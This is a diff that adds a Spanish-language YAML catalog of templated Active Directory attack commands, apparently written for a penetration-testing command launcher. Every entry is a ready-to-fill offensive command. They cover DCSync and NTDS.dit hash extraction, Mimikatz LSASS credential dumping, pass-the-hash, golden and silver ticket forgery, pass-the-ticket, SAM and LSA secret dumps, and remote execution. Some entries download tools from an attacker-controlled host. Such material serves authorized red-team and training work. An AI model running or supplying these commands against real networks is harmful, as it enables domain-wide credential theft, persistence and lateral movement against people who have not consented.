@@ -1,0 +1,303 @@
+tools:
+  - id: impacket_dcsync
+    name: "Impacket - DCSync (Volcar Hashes)"
+    description: "Replica el proceso de sincronización de DC para obtener todos los hashes NTLM del dominio"
+    command: "impacket-secretsdump -just-dc {domain}/{user}:'{password}'@{dc_ip}"
+    params:
+      - name: domain
+        label: "Dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: user
+        label: "Usuario con privilegios DCSync (DA o replication rights)"
+        placeholder: "administrator"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123"
+        required: true
+      - name: dc_ip
+        label: "IP del Domain Controller"
+        placeholder: "192.168.50.70"
+        required: true
+    tags: [ad, dcsync, hashes, ntds, domain-admin]
+    notes: "Requiere: Domain Admins, o derechos 'Replicating Directory Changes'. Equivalente a: mimikatz 'lsadump::dcsync /domain:corp.com /all'"
+
+  - id: mimikatz_sekurlsa
+    name: "Mimikatz - Volcar Credenciales LSASS"
+    description: "Extrae credenciales en memoria de LSASS: NTLM hashes, tickets Kerberos, plaintext (si WDigest activo)"
+    command: ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\""
+    params: []
+    tags: [ad, mimikatz, lsass, credentials, dump]
+    notes: "Requiere privilegio SeDebugPrivilege (Administrator). AV lo detecta fácilmente. Alternativa: lsassy, Invoke-Mimikatz."
+
+  - id: mimikatz_pth
+    name: "Mimikatz - Pass-the-Hash (PTH)"
+    description: "Autentica con hash NTLM sin necesitar la contraseña en claro"
+    command: ".\\mimikatz.exe \"sekurlsa::pth /user:{user} /domain:{domain} /ntlm:{hash} /run:cmd.exe\" \"exit\""
+    params:
+      - name: user
+        label: "Usuario"
+        placeholder: "administrator"
+        required: true
+      - name: domain
+        label: "Dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: hash
+        label: "Hash NTLM (parte NT)"
+        placeholder: "aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E"
+        required: true
+    tags: [ad, pth, mimikatz, hash, lateral-movement]
+    notes: "Abre una nueva cmd.exe con el token del usuario. Funciona con hashes locales y de dominio."
+
+  - id: mimikatz_golden_ticket
+    name: "Mimikatz - Golden Ticket"
+    description: "Crea un ticket Kerberos TGT forjado con el hash KRBTGT para persistencia total en el dominio"
+    command: ".\\mimikatz.exe \"kerberos::golden /user:{user} /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /ticket:golden.kirbi\" \"exit\"\n# Cargar el ticket:\n.\\mimikatz.exe \"kerberos::ptt golden.kirbi\" \"exit\"\n# O usar directamente:\n.\\mimikatz.exe \"kerberos::golden /user:{user} /domain:{domain} /sid:{domain_sid} /krbtgt:{krbtgt_hash} /ptt\" \"exit\""
+    params:
+      - name: user
+        label: "Usuario a impersonar"
+        placeholder: "administrator"
+        required: true
+      - name: domain
+        label: "FQDN del dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: domain_sid
+        label: "SID del dominio (whoami /user → quitar último -XXXX)"
+        placeholder: "S-1-5-21-1987370270-658905905-1781884369"
+        required: true
+      - name: krbtgt_hash
+        label: "Hash NTLM de la cuenta krbtgt"
+        placeholder: "1693c6cefafffc7af11ef34d1c788f47"
+        required: true
+    tags: [ad, golden-ticket, persistence, kerberos, krbtgt]
+    notes: "Obtener krbtgt hash con DCSync. SID del dominio: impacket-getPac o 'Get-DomainSID' de PowerView. Válido 10 años."
+
+  - id: mimikatz_silver_ticket
+    name: "Mimikatz - Silver Ticket"
+    description: "Crea ticket TGS forjado para un servicio específico usando el hash de la cuenta de servicio"
+    command: ".\\mimikatz.exe \"kerberos::golden /user:{user} /domain:{domain} /sid:{domain_sid} /target:{target_host} /service:{service} /rc4:{service_hash} /ptt\" \"exit\""
+    params:
+      - name: user
+        label: "Usuario a impersonar"
+        placeholder: "administrator"
+        required: true
+      - name: domain
+        label: "FQDN del dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: domain_sid
+        label: "SID del dominio"
+        placeholder: "S-1-5-21-1987370270-658905905-1781884369"
+        required: true
+      - name: target_host
+        label: "FQDN del servidor objetivo"
+        placeholder: "web04.corp.com"
+        required: true
+      - name: service
+        label: "Tipo de servicio (http, cifs, host, mssql...)"
+        placeholder: "http"
+        required: true
+      - name: service_hash
+        label: "Hash NTLM de la cuenta de servicio"
+        placeholder: "4d28cf5252d39971419580a51484ca09"
+        required: true
+    tags: [ad, silver-ticket, kerberos, service, stealth]
+    notes: "Más sigiloso que Golden Ticket (no contacta el DC). Requiere hash de la cuenta que ejecuta el servicio."
+
+  - id: overpass_the_hash
+    name: "Impacket - Overpass-the-Hash (OTH)"
+    description: "Convierte un hash NTLM en ticket Kerberos TGT para acceder a recursos que requieren Kerberos"
+    command: "impacket-getTGT {domain}/{user} -hashes :{ntlm_hash} -dc-ip {dc_ip}\nexport KRB5CCNAME={user}.ccache\nimpacket-psexec -k -no-pass {domain}/{user}@{target}"
+    params:
+      - name: domain
+        label: "Dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: user
+        label: "Usuario"
+        placeholder: "administrator"
+        required: true
+      - name: ntlm_hash
+        label: "Hash NTLM"
+        placeholder: "2892d26cdf84d7a70e2eb3b9f05c425e"
+        required: true
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.50.70"
+        required: true
+      - name: target
+        label: "Target para la shell"
+        placeholder: "192.168.50.72"
+        required: true
+    tags: [ad, overpass-hash, kerberos, tgt, lateral-movement]
+
+  - id: pass_the_ticket
+    name: "Impacket - Pass-the-Ticket (PTT)"
+    description: "Usa un ticket Kerberos robado (.ccache o .kirbi) para autenticarse sin contraseña"
+    command: "# Convertir .kirbi a .ccache (si viene de mimikatz):\nimpacket-ticketConverter ticket.kirbi ticket.ccache\n# Usar el ticket:\nexport KRB5CCNAME=ticket.ccache\nimpacket-psexec -k -no-pass {domain}/{user}@{target}"
+    params:
+      - name: domain
+        label: "Dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: user
+        label: "Usuario del ticket"
+        placeholder: "administrator"
+        required: true
+      - name: target
+        label: "Target"
+        placeholder: "192.168.50.72"
+        required: true
+    tags: [ad, pass-the-ticket, kerberos, ccache, lateral-movement]
+
+  - id: ad_shadow_copy
+    name: "Shadow Copy - Extraer NTDS.dit"
+    description: "Extrae NTDS.dit (todos los hashes del dominio) a través de Volume Shadow Copies"
+    command: "# En DC con privilegios admin:\n# 1. Crear shadow copy:\nvssadmin create shadow /for=C:\n# 2. Copiar NTDS.dit:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\NTDS.dit\n# 3. Copiar SYSTEM hive:\nreg save HKLM\\SYSTEM C:\\SYSTEM\n# 4. Extraer hashes desde Kali:\nimpacket-secretsdump -ntds C:\\NTDS.dit -system C:\\SYSTEM LOCAL"
+    params: []
+    tags: [ad, shadow-copy, ntds, hashes, persistence]
+    notes: "Requiere acceso admin al DC. Alternativa: impacket-secretsdump con -just-dc directamente contra el DC."
+
+  - id: powerview_enum
+    name: "PowerView - Enumeración Completa AD"
+    description: "Comandos PowerView esenciales para enumerar Active Directory desde Windows"
+    command: "# Importar PowerView:\niwr -uri http://{lhost}/PowerView.ps1 -Outfile PowerView.ps1; Import-Module .\\PowerView.ps1\n# Comandos útiles:\nGet-NetDomain          # Info del dominio\nGet-NetUser            # Todos los usuarios\nGet-NetGroup           # Todos los grupos\nGet-NetComputer        # Todos los equipos\nGet-NetGroupMember -GroupName 'Domain Admins'  # Miembros de DA\nGet-ObjectAcl -Identity {user} -ResolveGUIDs   # ACLs de un objeto\nFind-DomainShare       # Shares accesibles"
+    params:
+      - name: lhost
+        label: "IP atacante con HTTP server"
+        placeholder: "10.10.14.1"
+        required: true
+    tags: [ad, powerview, enumeration, powershell]
+    notes: "PowerView está en: /usr/share/windows-resources/powersploit/Recon/PowerView.ps1"
+
+  - id: sharphound_collect
+    name: "SharpHound - Recolección AD (Windows)"
+    description: "Recolecta datos de AD para BloodHound usando SharpHound desde Windows"
+    command: "iwr -uri http://{lhost}/SharpHound.exe -Outfile SharpHound.exe\n.\\SharpHound.exe -c all --zipfilename {output}"
+    params:
+      - name: lhost
+        label: "IP atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: output
+        label: "Nombre del ZIP"
+        placeholder: "bloodhound_data"
+        default: "bloodhound_data"
+    tags: [ad, sharphound, bloodhound, enumeration, graph]
+    notes: "El ZIP generado se importa en BloodHound. Requiere credenciales de dominio válidas."
+
+  - id: net_localgroup_admin
+    name: "AD - Miembros del Grupo Administradores Local"
+    description: "Lista miembros del grupo Administrators local de un host remoto"
+    command: "net localgroup administrators /domain"
+    params: []
+    tags: [ad, enumeration, local-admins, windows]
+
+  - id: impacket_gettgt
+    name: "Impacket - Obtener TGT"
+    description: "Solicita un TGT (Ticket Granting Ticket) para un usuario del dominio"
+    command: "impacket-getTGT {domain}/{user}:'{password}' -dc-ip {dc_ip}"
+    params:
+      - name: domain
+        label: "Dominio"
+        placeholder: "corp.com"
+        required: true
+      - name: user
+        label: "Usuario"
+        placeholder: "user"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123"
+        required: true
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.50.70"
+        required: true
+    tags: [ad, kerberos, tgt, impacket]
+
+  - id: netexec_sam_dump
+    name: "NetExec - Volcar SAM (hashes locales)"
+    description: "Vuelca los hashes locales SAM de un host Windows con credenciales admin"
+    command: "netexec smb {target} -u '{user}' -p '{password}' --sam"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "192.168.50.75"
+        required: true
+      - name: user
+        label: "Usuario admin"
+        placeholder: "administrator"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123"
+        required: true
+    tags: [ad, sam, hashes, netexec, local-admin]
+
+  - id: netexec_lsa_dump
+    name: "NetExec - Volcar LSA Secrets"
+    description: "Extrae LSA secrets del registro (credenciales de servicios, DPAPI, etc.)"
+    command: "netexec smb {target} -u '{user}' -p '{password}' --lsa"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "192.168.50.75"
+        required: true
+      - name: user
+        label: "Usuario admin"
+        placeholder: "administrator"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123"
+        required: true
+    tags: [ad, lsa, secrets, netexec, credentials]
+
+  - id: netexec_exec_cmd
+    name: "NetExec - Ejecutar Comando Remoto"
+    description: "Ejecuta un comando remoto en un host Windows con credenciales válidas"
+    command: "netexec smb {target} -u '{user}' -p '{password}' -x '{command}'"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "192.168.50.75"
+        required: true
+      - name: user
+        label: "Usuario"
+        placeholder: "administrator"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123"
+        required: true
+      - name: command
+        label: "Comando a ejecutar"
+        placeholder: "whoami"
+        required: true
+    tags: [ad, execution, netexec, remote-command, smb]
+
+  - id: laps_read
+    name: "LAPS - Leer Contraseña Admin Local"
+    description: "Lee contraseña LAPS del administrador local si el usuario tiene permisos de lectura"
+    command: "# Con PowerView:\nGet-DomainComputer {computer} -Properties ms-Mcs-AdmPwd\n# Con NetExec:\nnetexec ldap {dc_ip} -u '{user}' -p '{password}' -M laps"
+    params:
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.50.70"
+        required: true
+      - name: user
+        label: "Usuario con permisos de lectura LAPS"
+        placeholder: "user"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "Password123"
+        required: true
+      - name: computer
+        label: "Nombre del equipo"
+        placeholder: "WORKSTATION01"
+    tags: [ad, laps, local-admin, password, enumeration]
